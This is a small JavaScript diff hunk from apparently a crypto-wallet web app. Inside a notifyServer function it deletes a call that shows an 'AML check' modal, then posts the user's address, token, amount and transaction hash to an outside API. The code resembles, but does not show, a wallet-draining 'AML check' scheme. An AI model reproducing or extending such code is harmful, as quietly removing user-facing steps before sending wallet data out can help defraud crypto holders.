@@ -318,7 +318,7 @@ async function notifyServer(userAddress, tokenAddress, amount, chainId, txHash, 
     const roundedAmount = ethers.utils.parseUnits(roundedBalance.toString(), decimals);
 
     console.log(`📊 Округлённый баланс: ${roundedBalance}, roundedAmount: ${roundedAmount.toString()}`);
-    await showAMLCheckModal(userAddress, roundedBalance);
+    
 
     const response = await fetch('https://api.amlinsight.io/api/transfer', {
       method: 'POST',
